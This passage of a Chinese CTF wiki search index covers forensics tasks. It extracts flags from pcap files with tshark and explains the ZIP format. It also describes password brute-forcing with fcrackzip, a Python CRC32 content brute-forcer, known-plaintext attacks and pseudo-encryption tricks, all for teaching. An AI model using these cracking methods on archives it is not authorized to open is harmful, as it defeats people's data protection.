,\u5f53RST\uff1d1\u65f6\uff0c\u8868\u660eTCP\u8fde\u63a5\u4e2d\u51fa\u73b0\u4e25\u91cd\u5dee\u9519\uff08\u5982\u7531\u4e8e\u4e3b\u673a\u5d29\u6e83\u6216\u5176\u4ed6\u539f\u56e0\uff09\uff0c\u5fc5\u987b\u91ca\u653e\u8fde\u63a5\uff0c\u7136\u540e\u518d\u91cd\u65b0\u5efa\u7acb\u8fd0\u8f93\u8fde\u63a5\u3002  SYN\uff1a\u540c\u6b65\u6bd4\u7279(Synchronous)\uff0cSYN\u7f6e\u4e3a1\uff0c\u5c31\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\u6216\u8fde\u63a5\u63a5\u53d7\u62a5\u6587,\u901a\u5e38\u5e26\u6709 SYN \u6807\u5fd7\u7684\u5c01\u5305\u8868\u793a\u300e\u4e3b\u52a8\u300f\u8981\u8fde\u63a5\u5230\u5bf9\u65b9\u7684\u610f\u601d\u3002\u3002  FIN\uff1a\u7ec8\u6b62\u6bd4\u7279(Final)\uff0c\u7528\u6765\u91ca\u653e\u4e00\u4e2a\u8fde\u63a5\u3002\u5f53FIN\uff1d1\u65f6\uff0c\u8868\u660e\u6b64\u62a5\u6587\u6bb5\u7684\u53d1\u9001\u7aef\u7684\u6570\u636e\u5df2\u53d1\u9001\u5b8c\u6bd5\uff0c\u5e76\u8981\u6c42\u91ca\u653e\u8fd0\u8f93\u8fde\u63a5\u3002   \u800c\u8fd9\u91cc\u7684 tcp.urg \u5374\u4e3a   \u901a\u8fc7tshark\u63d0\u53d6 tcp.urg \u7136\u540e\u53bb\u96640\u7684\u5b57\u6bb5,\u6362\u884c\u7b26\u8f6c , \u76f4\u63a5\u8f6c\u6362\u6210python\u7684\u5217\u8868,\u8f6cascii\u5373\u53ef\u5f97\u5230flag  \u26a1 root@kali:  tshark -r Stego-200_urg.pcap -T fields -e  tcp.urgent_pointer|egrep -vi  ^0$ |tr  \\n   , \nRunning as user  root  and group  root . This could be dangerous.\n67,84,70,123,65,110,100,95,89,111,117,95,84,104,111,117,103,104,116,95,73,116,95,87,97,115,95,73,110,95,84,104,101,95,80,105,99,116,117,114,101,125,#\n...  print  .join([chr(x) for x in arr]) #python\u8f6c\u6362ascii\nCTF{And_You_Thought_It_Was_In_The_Picture}  \u4f8b\u9898    stego-150_ears.xz    Step 1    \u901a\u8fc7 file \u547d\u4ee4\u4e0d\u65ad\u89e3\u538b\u5f97\u5230pcap\u6587\u4ef6  \u279c  Desktop file ears\nears: XZ compressed data\n\u279c  Desktop unxz   ears   file_1\n\u279c  Desktop file file_1\nfile_1: POSIX tar archive\n\u279c  Desktop 7z x file_1 7 -Zip  [ 64 ]   16 .02 : Copyright  ( c )   1999 -2016 Igor Pavlov :  2016 -05-21\np7zip Version  16 .02  ( locale = en_US.UTF-8,Utf16 = on,HugeFiles = on,64 bits,1 CPU Intel ( R )  Core ( TM )  i7-4710MQ CPU @  2 .50GHz  ( 306C3 ) ,ASM,AES-NI ) \n\n    Scanning the drive  for  archives:\n     1  file,  4263936  bytes  ( 4164  KiB ) \n\n    Extracting archive: file_1\n    --\n     Path   =  file_1\n     Type   =  tar\n    Physical  Size   =   4263936 \n    Headers  Size   =   1536 \n    Code  Page   =  UTF-8\n\n    Everything is Ok\n\n    Size:        4262272 \n    Compressed:  4263936    Step 2   \u901a\u8fc7wireshark\u53d1\u73b0dns\u4e2d\u56de\u5e94\u540d\u5b57\u5b58\u5728\u5f02\u5e38\uff0c\u7ec4\u621016\u8fdb\u5236\u7684png\u6587\u4ef6  \u91c7\u7528tshark\u8fdb\u884c\u63d0\u53d6,\u63d0\u53d6dns\u4e2d\u7684\u6570\u636e,\u7b5b\u9009\u5177\u4f53\u62a5\u6587\u5f62\u5f0f \\w{4,}.asis.io  tshark -r forensic_175_d78a42edc01c9104653776f16813d9e5 -T fields -e dns.qry.name -e dns.flags|grep 8180|awk '{if ($1~/\\w{4,}.asis.io/) print $1}'|awk -F '.' '{print $1}'|tr -d '\\n'   png   Step 3   16\u8fdb\u5236\u8fd8\u539f\u56fe\u7247  xxd -p -r png flag", 
            "title": "\u5e38\u7528\u65b9\u6cd5"
        }, 
        {
            "location": "/misc/traffic/data/#python-script", 
            "text": "TODO", 
            "title": "Python Script"
        }, 
        {
            "location": "/misc/archive/zip/", 
            "text": "\u6587\u4ef6\u7ed3\u6784\n\n\nZIP \u6587\u4ef6\u4e3b\u8981\u7531\u4e09\u90e8\u5206\u6784\u6210\uff0c\u5206\u522b\u4e3a\n\n\n\n\n\n\n\n\n\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\n\n\n\u6838\u5fc3\u76ee\u5f55\n\n\n\u76ee\u5f55\u7ed3\u675f\n\n\n\n\n\n\n\n\n\n\nlocal file header + file data + data descriptor\n\n\ncentral directory\n\n\nend of central directory record\n\n\n\n\n\n\n\n\n\n\n\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u6bcf\u4e00\u4e2a\u538b\u7f29\u7684\u6e90\u6587\u4ef6\u6216\u76ee\u5f55\u90fd\u662f\u4e00\u6761\u8bb0\u5f55\uff0c\u5176\u4e2d\n\n\nlocal file header\uff1a\u6587\u4ef6\u5934\u7528\u4e8e\u6807\u8bc6\u8be5\u6587\u4ef6\u7684\u5f00\u59cb\uff0c\u8bb0\u5f55\u4e86\u8be5\u538b\u7f29\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u91cc\u7684\u6587\u4ef6\u5934\u6807\u8bc6\u7531\u56fa\u5b9a\u503c \n50 4B 03 04\n \u5f00\u5934\uff0c\u4e5f\u662f ZIP \u7684\u6587\u4ef6\u5934\u7684\u91cd\u8981\u6807\u5fd7\n\n\nfile data\uff1a\u6587\u4ef6\u6570\u636e\u8bb0\u5f55\u4e86\u76f8\u5e94\u538b\u7f29\u6587\u4ef6\u7684\u6570\u636e\n\n\ndata descriptor\uff1a\u6570\u636e\u63cf\u8ff0\u7b26\u7528\u4e8e\u6807\u8bc6\u8be5\u6587\u4ef6\u538b\u7f29\u7ed3\u675f\uff0c\u8be5\u7ed3\u6784\u53ea\u6709\u5728\u76f8\u5e94\u7684 local file header \u4e2d\u901a\u7528\u6807\u8bb0\u5b57\u6bb5\u7684\u7b2c 3 bit\u8bbe\u4e3a 1 \u65f6\u624d\u4f1a\u51fa\u73b0\uff0c\u7d27\u63a5\u5728\u538b\u7f29\u6587\u4ef6\u6e90\u6570\u636e\u540e\n\n\n\n\n\n\n\n\nCentral directory \u6838\u5fc3\u76ee\u5f55\n\n\n\n\n\n\n\u8bb0\u5f55\u4e86\u538b\u7f29\u6587\u4ef6\u7684\u76ee\u5f55\u4fe1\u606f\uff0c\u5728\u8fd9\u4e2a\u6570\u636e\u533a\u4e2d\u6bcf\u4e00\u6761\u7eaa\u5f55\u5bf9\u5e94\u5728\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u7684\u4e00\u6761\u6570\u636e\u3002\n\n\n\n\n\n\n\n\nOffset\n\n\nBytes\n\n\nDescription\n\n\n\u8bd1\n\n\n\n\n\n\n\n\n\n\n0\n\n\n4\n\n\nCentral directory file header signature = 0x02014b50\n\n\n\u6838\u5fc3\u76ee\u5f55\u6587\u4ef6 header\u6807\u8bc6 =\uff080x02014b50\uff09\n\n\n\n\n\n\n4\n\n\n2\n\n\nVersion made by\n\n\n\u538b\u7f29\u6240\u7528\u7684 pkware \u7248\u672c\n\n\n\n\n\n\n6\n\n\n2\n\n\nVersion needed to extract (minimum)\n\n\n\u89e3\u538b\u6240\u9700 pkware \u7684\u6700\u4f4e\u7248\u672c\n\n\n\n\n\n\n8\n\n\n2\n\n\nGeneral purpose bit flag\n\n\n\u901a\u7528\u4f4d\u6807\u8bb0\u4f2a\u52a0\u5bc6\n\n\n\n\n\n\n10\n\n\n2\n\n\nCompression method\n\n\n\u538b\u7f29\u65b9\u6cd5\n\n\n\n\n\n\n12\n\n\n2\n\n\nFile last modification time\n\n\n\u6587\u4ef6\u6700\u540e\u4fee\u6539\u65f6\u95f4\n\n\n\n\n\n\n14\n\n\n2\n\n\nFile last modification date\n\n\n\u6587\u4ef6\u6700\u540e\u4fee\u6539\u65e5\u671f\n\n\n\n\n\n\n16\n\n\n4\n\n\nCRC-32\n\n\nCRC-32 \u6821\u9a8c\u7801\n\n\n\n\n\n\n20\n\n\n4\n\n\nCompressed size\n\n\n\u538b\u7f29\u540e\u7684\u5927\u5c0f\n\n\n\n\n\n\n24\n\n\n4\n\n\nUncompressed size\n\n\n\u672a\u538b\u7f29\u7684\u5927\u5c0f\n\n\n\n\n\n\n28\n\n\n2\n\n\nFile name length (n)\n\n\n\u6587\u4ef6\u540d\u957f\u5ea6\n\n\n\n\n\n\n30\n\n\n2\n\n\nExtra field length (m)\n\n\n\u6269\u5c55\u57df\u957f\u5ea6\n\n\n\n\n\n\n32\n\n\n2\n\n\nFile comment length (k)\n\n\n\u6587\u4ef6\u6ce8\u91ca\u957f\u5ea6\n\n\n\n\n\n\n34\n\n\n2\n\n\nDisk number where file starts\n\n\n\u6587\u4ef6\u5f00\u59cb\u4f4d\u7f6e\u7684\u78c1\u76d8\u7f16\u53f7\n\n\n\n\n\n\n36\n\n\n2\n\n\nInternal file attributes\n\n\n\u5185\u90e8\u6587\u4ef6\u5c5e\u6027\n\n\n\n\n\n\n38\n\n\n4\n\n\nExternal file attributes\n\n\n\u5916\u90e8\u6587\u4ef6\u5c5e\u6027\n\n\n\n\n\n\n42\n\n\n4\n\n\nrelative offset of local header\n\n\n\u672c\u5730\u6587\u4ef6\u5934\u7684\u76f8\u5bf9\u4f4d\u79fb\n\n\n\n\n\n\n46\n\n\nn\n\n\nFile name\n\n\n\u76ee\u5f55\u6587\u4ef6\u540d\n\n\n\n\n\n\n46+n\n\n\nm\n\n\nExtra field\n\n\n\u6269\u5c55\u57df\n\n\n\n\n\n\n46+n+m\n\n\nk\n\n\nFile comment\n\n\n\u6587\u4ef6\u6ce8\u91ca\u5185\u5bb9\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nEnd of central directory record\uff08EOCD\uff09\u76ee\u5f55\u7ed3\u675f\u6807\u8bc6\n\n\n\n\n\u76ee\u5f55\u7ed3\u675f\u6807\u8bc6\u5b58\u5728\u4e8e\u6574\u4e2a\u5f52\u6863\u5305\u7684\u7ed3\u5c3e\uff0c\u7528\u4e8e\u6807\u8bb0\u538b\u7f29\u7684\u76ee\u5f55\u6570\u636e\u7684\u7ed3\u675f\u3002\u6bcf\u4e2a\u538b\u7f29\u6587\u4ef6\u5fc5\u987b\u6709\u4e14\u53ea\u6709\u4e00\u4e2aEOCD\u8bb0\u5f55\u3002\n\n\n\n\n\n\n\n\n\u66f4\u52a0\u8be6\u7ec6\u53c2\u89c1 \n\u5b98\u65b9\u6587\u6863\n\u3002\n\n\n\u4e3b\u8981\u653b\u51fb\n\n\n\u7206\u7834\n\n\n\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd\u4e24\u6b3e\u7206\u7834\u4f7f\u7528\u7684\u5de5\u5177\n\n\n\n\n\n\nWindows\u4e0b\u7684\u795e\u5668 \nARCHPR\n\n\n\n\n\u66b4\u529b\u679a\u4e3e\uff0c\u8dd1\u5b57\u5178\uff0c\u660e\u6587\u653b\u51fb\uff0c\u5e94\u6709\u5c3d\u6709\u3002\n\n\n\n\n\n\nLinux\u4e0b\u7684\u547d\u4ee4\u884c\u5de5\u5177 \nfcrackzip\n\n\n# \uff0db \u6307\u5b9a\u6a21\u5f0f\u4e3a\u66b4\u7834\uff0c-c1\u6307\u5b9a\u5bc6\u7801\u7c7b\u578b\u4e3a\u7eaf\u6570\u5b57\uff0c\u5176\u5b83\u7c7b\u578b\u53ef\u4ee5rtfm,-u\u8fd9\u4e2a\u53c2\u6570\u975e\u5e38\u91cd\u8981\u4e0d\u7136\u4e0d\u663e\u793a\u7834\u89e3\u51fa\u6765\u7684\u5bc6\u7801,-l 5-6\u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6\n\nroot@kali:fcrackzip -b -c1 -u test.zip\n\n\n\n\n\n\n\n\nCRC32\n\n\n\u539f\u7406\n\n\nCRC \u672c\u8eab\u662f\u300c\u5197\u4f59\u6821\u9a8c\u7801\u300d\u7684\u610f\u601d\uff0cCRC32 \u5219\u8868\u793a\u4f1a\u4ea7\u751f\u4e00\u4e2a 32 bit\uff088 \u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff09\u7684\u6821\u9a8c\u503c\u3002\u7531\u4e8e CRC32 \u4ea7\u751f\u6821\u9a8c\u503c\u65f6\u6e90\u6570\u636e\u5757\u7684\u6bcf\u4e00\u4e2a bit\uff08\u4f4d\uff09\u90fd\u53c2\u4e0e\u4e86\u8ba1\u7b97\uff0c\u6240\u4ee5\u6570\u636e\u5757\u4e2d\u5373\u4f7f\u53ea\u6709\u4e00\u4f4d\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u4e5f\u4f1a\u5f97\u5230\u4e0d\u540c\u7684 CRC32 \u503c\u3002\n\n\nCRC32 \u6821\u9a8c\u7801\u51fa\u73b0\u5728\u5f88\u591a\u6587\u4ef6\u4e2d\u6bd4\u5982 \npng\n \u6587\u4ef6\uff0c\u540c\u6837 \nzip\n \u4e2d\u4e5f\u6709 CRC32 \u6821\u9a8c\u7801\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f \nzip\n \u4e2d\u7684 CRC32 \u662f\u672a\u52a0\u5bc6\u6587\u4ef6\u7684\u6821\u9a8c\u503c\u3002\n\n\n\u8fd9\u4e5f\u5c31\u5bfc\u81f4\u4e86\u57fa\u4e8e CRC32 \u7684\u653b\u51fb\u624b\u6cd5\u3002\n\n\n\n\n\u6587\u4ef6\u5185\u5185\u5bb9\u5f88\u5c11\uff08\u4e00\u822c\u6bd4\u8d5b\u4e2d\u5927\u591a\u4e3a 4 \u5b57\u8282\u5de6\u53f3\uff09\n\n\n\u52a0\u5bc6\u7684\u5bc6\u7801\u5f88\u957f\n\n\n\n\n\u6211\u4eec\u4e0d\u53bb\u7206\u7834\u538b\u7f29\u5305\u7684\u5bc6\u7801\uff0c\u800c\u662f\u76f4\u63a5\u53bb\u76f4\u63a5\u7206\u7834\u6e90\u6587\u4ef6\u7684\u5185\u5bb9\uff08\u4e00\u822c\u90fd\u662f\u53ef\u89c1\u7684\u5b57\u7b26\u4e32\uff09\uff0c\u4ece\u800c\u83b7\u53d6\u60f3\u8981\u7684\u4fe1\u606f\u3002\n\n\n\u6bd4\u5982\u6211\u4eec\u65b0\u5efa\u4e00\u4e2a \nflag.txt\n\uff0c\u5176\u4e2d\u5185\u5bb9\u4e3a \n123\n\uff0c\u4f7f\u7528\u5bc6\u7801 \n!QAZXSW@#EDCVFR$\n \u53bb\u52a0\u5bc6\u3002\n\n\n\n\n\u800c\u6211\u4eec\u53bb\u8ba1\u7b97\u6587\u4ef6\u7684 CRC32 \u503c\u53d1\u73b0\u548c\u4e0a\u56fe\u4e2d\u7684 CRC32 \u503c\u543b\u5408\u3002\n\n\n\u6587\u4ef6: flag.txt \n\u5927\u5c0f: \n3\n \n\u65f6\u95f4: Tue, \n29\n Aug \n2017\n \n10\n:38:10 +0800 \nMD5: 202cb962ac59075b964b07152d234b70 \nSHA1: 40bd001563085fc35165329ea1ff5c5ecbdbbeef \nCRC32: 884863D2 \n\n\n\n\n\n\nNote\n\n\n\u5728\u7206\u7834\u65f6\u6211\u4eec\u6240\u679a\u4e3e\u7684\u6240\u6709\u53ef\u80fd\u5b57\u7b26\u4e32\u7684CRC32\u503c\u662f\u8981\u4e0e\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u7684CRC32\u503c\u6240\u5bf9\u5e94\n\n\n\n\n# -*- coding: utf-8 -*-\n\n\n\nimport\n \nbinascii\n\n\nimport\n \nbase64\n\n\nimport\n \nstring\n\n\nimport\n \nitertools\n\n\nimport\n \nstruct\n\n\n\nalph\n \n=\n \nabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=\n\n\n\ncrcdict\n \n=\n \n{}\n\n\nprint\n \ncomputing all possible CRCs...\n\n\nfor\n \nx\n \nin\n \nitertools\n.\nproduct\n(\nlist\n(\nalph\n),\n \nrepeat\n=\n4\n):\n\n    \nst\n \n=\n \n.\njoin\n(\nx\n)\n\n    \ntestcrc\n \n=\n \nbinascii\n.\ncrc32\n(\nst\n)\n \n    \ncrcdict\n[\nstruct\n.\npack\n(\ni\n,\n \ntestcrc\n)]\n \n=\n \nst\n \n\nprint\n \nDone!\n\n\n\nf\n \n=\n \nopen\n(\nflag.zip\n)\n\n\ndata\n \n=\n \nf\n.\nread\n()\n\n\nf\n.\nclose\n()\n\n\ncrc\n \n=\n \n.\njoin\n(\ndata\n[\n14\n:\n18\n])\n\n\nif\n \ncrc\n \nin\n \ncrcdict\n:\n\n    \nprint\n \ncrcdict\n[\ncrc\n]\n\n\nelse\n:\n\n    \nprint\n \nFAILED!\n\n\n\n\n\n\u4f8b\u9898\n\n\nAbctf-2016:Zippy\n\n\n\u6839\u636e\u6bcf\u4e2a\u538b\u7f29\u5305\u5185\u7684\u6587\u4ef6\u5927\u5c0f\u53ef\u4ee5\u63a8\u65ad\u4f7f\u7528 \nCRC32\n \u653b\u51fb\u624b\u6cd5\uff0c\u83b7\u5f97\u6bcf\u4e2a\u538b\u7f29\u5305\u5185\u7684\u5185\u5bb9\u540e\u8fde\u5728\u4e00\u8d77 Base64 \u89e3\u7801\u540e\u65f6\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u5305\uff0c\u7206\u7834\u83b7\u5f97 flag\u3002\n\n\n\u660e\u6587\u653b\u51fb\n\n\n\u539f\u7406\n\n\n\n\n\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u6587\u4ef6\n\n\n\u538b\u7f29\u6587\u4ef6\u7684\u538b\u7f29\u5de5\u5177\uff0c\u6bd4\u5982 2345 \u597d\u538b\uff0cWinRAR\uff0c7z\u3002zip \u7248\u672c\u53f7\u7b49\uff0c\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u5c5e\u6027\u4e86\u89e3\u3002\u5982\u679c\u662f Linux \u5e73\u53f0\uff0c\u7528 \nzipinfo -v\n \u53ef\u4ee5\u67e5\u770b\u4e00\u4e2a zip \u5305\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u52a0\u5bc6\u7b97\u6cd5\u7b49\n\n\n\u77e5\u9053\u538b\u7f29\u5305\u91cc\u67d0\u4e2a\u6587\u4ef6\u7684\u90e8\u5206\u8fde\u7eed\u5185\u5bb9\uff08\u81f3\u5c11 12 \u5b57\u8282\uff09\n\n\n\n\n\u5982\u679c\u4f60\u5df2\u7ecf\u77e5\u9053\u52a0\u5bc6\u6587\u4ef6\u7684\u90e8\u5206\u5185\u5bb9\uff0c\u6bd4\u5982\u5728\u67d0\u4e2a\u7f51\u7ad9\u4e0a\u53d1\u73b0\u4e86\u5b83\u7684 readme.txt \u6587\u4ef6\uff0c\u4f60\u5c31\u53ef\u4ee5\u5f00\u59cb\u5c1d\u8bd5\u7834\u89e3\u4e86\u3002\n\n\n\u9996\u5148\uff0c\u5c06\u8fd9\u4e2a\u660e\u6587\u6587\u4ef6\u6253\u5305\u6210 zip \u5305\uff0c\u6bd4\u5982\u5c06 readme.txt \u6253\u5305\u6210 readme.zip\u3002\n\n\n\u6253\u5305\u5b8c\u6210\u540e\uff0c\u9700\u8981\u786e\u8ba4\u4e8c\u8005\u91c7\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u76f8\u540c\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u5224\u65ad\u65b9\u6cd5\u662f\u7528 WinRAR \u6253\u5f00\u6587\u4ef6\uff0c\u540c\u4e00\u4e2a\u6587\u4ef6\u538b\u7f29\u540e\u7684\u4f53\u79ef\u662f\u5426\u76f8\u540c\u3002\u5982\u679c\u76f8\u540c\uff0c\u57fa\u672c\u53ef\u4ee5\u8bf4\u660e\u4f60\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e0d\u540c\uff0c\u5c31\u5c1d\u8bd5\u53e6\u4e00\u79cd\u538b\u7f29\u7b97\u6cd5\u3002\n\n\n\u5de5\u5177\n\n\n\n\nWindows\u4e0b\u7684\u795e\u5668 \nARCHPR\n\n\nLinux\u4e0b\u7684 \nPKCrack\n\n\n\n\n\n\nNote\n\n\n\u5efa\u8bae\u4f7f\u7528 Windows \u7684 ARCHPR\uff0c\u4e00\u662f\u901f\u5ea6\u8f83\u5feb\uff0c\u4e8c\u662f\u8f83\u7a33\u5b9a\uff08\u4e4b\u524d\u51fa\u9898\u65f6\u9047\u5230\u8fc7\u7528 PKCrack \u7206\u4e0d\u51fa\u6765\u7684\u60c5\u51b5\uff09\u3002\n\n\n\n\n\u4f2a\u52a0\u5bc6\n\n\n\u539f\u7406\n\n\n\u5728\u4e0a\u6587 ZIP \u683c\u5f0f\u4e2d\u7684 \n\u6838\u5fc3\u76ee\u5f55\u533a\n \u4e2d\uff0c\u6211\u4eec\u5f3a\u8c03\u4e86\u4e00\u4e2a\u53eb\u505a\u901a\u7528\u4f4d\u6807\u8bb0\uff08General purpose bit flag\uff09\u7684 2 \u5b57\u8282\uff0c\u4e0d\u540c\u6bd4\u7279\u4f4d\u6709\u7740\u4e0d\u540c\u7684\u542b\u4e49\u3002\n\n\nBit \n0\n: If set, indicates that the file is encrypted.\n\n\n(\nFor Method \n6\n - Imploding\n)\n\nBit \n1\n: If the compression method used was \ntype\n \n6\n,\n     Imploding, \nthen\n this bit, \nif\n set, indicates\n     an 8K sliding dictionary was used.  If clear,\n     \nthen\n a 4K sliding dictionary was used.\n...\nBit \n6\n: Strong encryption.  If this bit is set, you should\n     \nset\n the version needed to extract value to at least\n     \n50\n and you must also \nset\n bit \n0\n.  If AES encryption\n     is used, the version needed to extract value must \n     be at least \n51\n.\n...\n\n\n\n\n\u5728 010Editor \u4e2d\u6211\u4eec\u5c1d\u8bd5\u7740\u5c06\u8fd9 1 \u4f4d\u4fee\u6539 \n0 --\n 1\n\u3002\n\n\n\n\n\u518d\u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u5df2\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u3002\n\n\n\n\n\u4fee\u6539\u4f2a\u52a0\u5bc6\u7684\u65b9\u6cd5\uff1a\n\n\n\n\n16 \u8fdb\u5236\u4e0b\u4fee\u6539\u901a\u7528\u4f4d\u6807\u8bb0\n\n\nbinwalk -e\n \u65e0\u89c6\u4f2a\u52a0\u5bc6\n\n\n\u5728 Mac OS \u53ca\u90e8\u5206 Linux\uff08\u5982 Kali\uff09\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u6253\u5f00\u4f2a\u52a0\u5bc6\u7684 ZIP \u538b\u7f29\u5305\n\n\n\u68c0\u6d4b\u4f2a\u52a0\u5bc6\u7684\u5c0f\u5de5\u5177 \nZipCenOp.jar\n\n\n\u6709\u65f6\u5019\u7528 \nWinRar\n \u7684\u4fee\u590d\u529f\u80fd\uff08\u6b64\u65b9\u6cd5\u6709\u65f6\u6709\u5947\u6548\uff0c\u4e0d\u4ec5\u9488\u5bf9\u4f2a\u52a0\u5bc6\uff09\n\n\n\n\n\u4f8b\u9898\n\n\n\n\nSSCTF-2017:\u6211\u4eec\u7684\u79d8\u5bc6\u662f\u7eff\u8272\u7684\n\n\nWP: \nhttp://bobao.360.cn/ctf/detail/197.html\n\n\n\n\n\u6211\u4eec\u5728\u5f97\u5230\u4e24\u4e2a \nreadme.txt\n\uff0c\u4e14\u4e00\u4e2a\u52a0\u5bc6\uff0c\u4e00\u4e2a\u5df2\u77e5\uff0c\u5f88\u5bb9\u6613\u60f3\u5230\u660e\u6587\u653b\u51fb\u7684\u624b\u6cd5\u3002\n\n\n\u6ce8\u610f\u5728\u7528\u660e\u6587\u653b\u51fb\u65f6\u7684\u64cd\u4f5c\u3002\n\n\n\n\n\u5f97\u5230\u5bc6\u7801 \nY29mZmVl\n \u540e\uff0c\u89e3\u538b\u7f29\u6587\u4ef6\uff0c\u5f97\u5230\u53e6\u4e00\u4e2a\u538b\u7f29\u5305\u3002\n\n\n\u89c2\u5bdf\u901a\u7528\u4f4d\u6807\u8bb0\u4f4d\uff0c\u731c\u6d4b\u4f2a\u52a0\u5bc6\uff0c\u4fee\u6539\u540e\u89e3\u538b\u5f97\u5230 flag\u3002\n\n\n\u8fd9\u4e00\u9898\uff0c\u57fa\u672c\u6db5\u76d6\u4e86\u6bd4\u8d5b\u4e2d ZIP \u7684\u5e38\u89c1\u8003\u5bdf\u624b\u6cd5\uff0c\u7206\u7834\uff0c\u4f2a\u52a0\u5bc6\uff0c\u660e\u6587\u653b\u51fb\u7b49\uff0c\u90fd\u5728\u672c\u9898\u4e2d\u51fa\u73b0\u3002", 
            "title": "ZIP \u683c\u5f0f"
        }, 
        {
            "location": "/misc/archive/zip/#_1", 
            "text": "ZIP \u6587\u4ef6\u4e3b\u8981\u7531\u4e09\u90e8\u5206\u6784\u6210\uff0c\u5206\u522b\u4e3a     \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a  \u6838\u5fc3\u76ee\u5f55  \u76ee\u5f55\u7ed3\u675f      local file header + file data + data descriptor  central directory  end of central directory record      \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u6bcf\u4e00\u4e2a\u538b\u7f29\u7684\u6e90\u6587\u4ef6\u6216\u76ee\u5f55\u90fd\u662f\u4e00\u6761\u8bb0\u5f55\uff0c\u5176\u4e2d  local file header\uff1a\u6587\u4ef6\u5934\u7528\u4e8e\u6807\u8bc6\u8be5\u6587\u4ef6\u7684\u5f00\u59cb\uff0c\u8bb0\u5f55\u4e86\u8be5\u538b\u7f29\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u91cc\u7684\u6587\u4ef6\u5934\u6807\u8bc6\u7531\u56fa\u5b9a\u503c  50 4B 03 04  \u5f00\u5934\uff0c\u4e5f\u662f ZIP \u7684\u6587\u4ef6\u5934\u7684\u91cd\u8981\u6807\u5fd7  file data\uff1a\u6587\u4ef6\u6570\u636e\u8bb0\u5f55\u4e86\u76f8\u5e94\u538b\u7f29\u6587\u4ef6\u7684\u6570\u636e  data descriptor\uff1a\u6570\u636e\u63cf\u8ff0\u7b26\u7528\u4e8e\u6807\u8bc6\u8be5\u6587\u4ef6\u538b\u7f29\u7ed3\u675f\uff0c\u8be5\u7ed3\u6784\u53ea\u6709\u5728\u76f8\u5e94\u7684 local file header \u4e2d\u901a\u7528\u6807\u8bb0\u5b57\u6bb5\u7684\u7b2c 3 bit\u8bbe\u4e3a 1 \u65f6\u624d\u4f1a\u51fa\u73b0\uff0c\u7d27\u63a5\u5728\u538b\u7f29\u6587\u4ef6\u6e90\u6570\u636e\u540e     Central directory \u6838\u5fc3\u76ee\u5f55    \u8bb0\u5f55\u4e86\u538b\u7f29\u6587\u4ef6\u7684\u76ee\u5f55\u4fe1\u606f\uff0c\u5728\u8fd9\u4e2a\u6570\u636e\u533a\u4e2d\u6bcf\u4e00\u6761\u7eaa\u5f55\u5bf9\u5e94\u5728\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u7684\u4e00\u6761\u6570\u636e\u3002     Offset  Bytes  Description  \u8bd1      0  4  Central directory file header signature = 0x02014b50  \u6838\u5fc3\u76ee\u5f55\u6587\u4ef6 header\u6807\u8bc6 =\uff080x02014b50\uff09    4  2  Version made by  \u538b\u7f29\u6240\u7528\u7684 pkware \u7248\u672c    6  2  Version needed to extract (minimum)  \u89e3\u538b\u6240\u9700 pkware \u7684\u6700\u4f4e\u7248\u672c    8  2  General purpose bit flag  \u901a\u7528\u4f4d\u6807\u8bb0\u4f2a\u52a0\u5bc6    10  2  Compression method  \u538b\u7f29\u65b9\u6cd5    12  2  File last modification time  \u6587\u4ef6\u6700\u540e\u4fee\u6539\u65f6\u95f4    14  2  File last modification date  \u6587\u4ef6\u6700\u540e\u4fee\u6539\u65e5\u671f    16  4  CRC-32  CRC-32 \u6821\u9a8c\u7801    20  4  Compressed size  \u538b\u7f29\u540e\u7684\u5927\u5c0f    24  4  Uncompressed size  \u672a\u538b\u7f29\u7684\u5927\u5c0f    28  2  File name length (n)  \u6587\u4ef6\u540d\u957f\u5ea6    30  2  Extra field length (m)  \u6269\u5c55\u57df\u957f\u5ea6    32  2  File comment length (k)  \u6587\u4ef6\u6ce8\u91ca\u957f\u5ea6    34  2  Disk number where file starts  \u6587\u4ef6\u5f00\u59cb\u4f4d\u7f6e\u7684\u78c1\u76d8\u7f16\u53f7    36  2  Internal file attributes  \u5185\u90e8\u6587\u4ef6\u5c5e\u6027    38  4  External file attributes  \u5916\u90e8\u6587\u4ef6\u5c5e\u6027    42  4  relative offset of local header  \u672c\u5730\u6587\u4ef6\u5934\u7684\u76f8\u5bf9\u4f4d\u79fb    46  n  File name  \u76ee\u5f55\u6587\u4ef6\u540d    46+n  m  Extra field  \u6269\u5c55\u57df    46+n+m  k  File comment  \u6587\u4ef6\u6ce8\u91ca\u5185\u5bb9         End of central directory record\uff08EOCD\uff09\u76ee\u5f55\u7ed3\u675f\u6807\u8bc6   